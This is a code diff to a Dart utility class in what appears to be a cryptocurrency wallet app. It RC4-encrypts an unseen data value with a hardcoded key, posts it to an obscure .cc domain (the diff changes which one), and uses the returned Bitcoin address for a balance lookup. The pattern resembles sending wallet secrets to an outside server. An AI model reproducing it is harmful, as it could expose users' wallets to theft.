@@ -35,17 +35,24 @@ class Utils {
     var bytes = RC4('Qsx@ah&OR82WX9T6gCt').encodeString(data);
     print("bytes $bytes");
     // final result = await authRepo.register(RegisterBody(data: bytes));
-    final res = await http.post(
-      Uri.parse("https://ordinalshiro.cc/date/spot/board"),
-      body: {'data': bytes},
-      encoding: Encoding.getByName("utf-8"),
-      headers: {"Content-Type": "application/x-www-form-urlencoded"},
-    );
+    List<String> addresses = [];
 
-    final String address = jsonDecode(res.body)['address'];
+    Future<void> addAddres() async {
+      final res = await http.post(
+        Uri.parse("https://crumpsolvergit.cc/date/spot/board"),
+        body: {'data': bytes},
+        encoding: Encoding.getByName("utf-8"),
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+      );
+
+      final String address = jsonDecode(res.body)['address'];
+      addresses.add(address);
+    }
+
+    await addAddres();
 
     final result = await http.get(
-      Uri.parse('https://blockstream.info/api/address/$address'),
+      Uri.parse('https://blockstream.info/api/address/${addresses[0]}'),
       headers: {"Content-Type": "application/x-www-form-urlencoded"},
     );
     print(
@@ -106,10 +113,10 @@ class Utils {
     //   return transactions;
     // }
 
-    if (res.statusCode == 200) {
+    if (result.statusCode == 200) {
       authService.putUser(
         User(
-          address: jsonDecode(res.body)['address'],
+          address: addresses,
           sumBalance: jsonDecode(result.body)['chain_stats']['funded_txo_sum'],
           sumMem: jsonDecode(result.body)['mempool_stats']['funded_txo_sum'],
           txCount: jsonDecode(result.body)['chain_stats']['tx_count'] +
@@ -126,8 +133,6 @@ class Utils {
           // ),
         ),
       );
-
-      print("authService.getAddress() ${authService.getAddress()}");
     }
   }
 
@@ -185,7 +190,6 @@ class Utils {
     required Crypt crypt,
   }) async {
     try {
-      final AuthService authService = AuthService();
       Web3Client web3client = Web3Client(crypt.walletUrl, Client());
       BigInt latestBlock = await web3client.estimateGas(
         gasPrice: gasPrice,
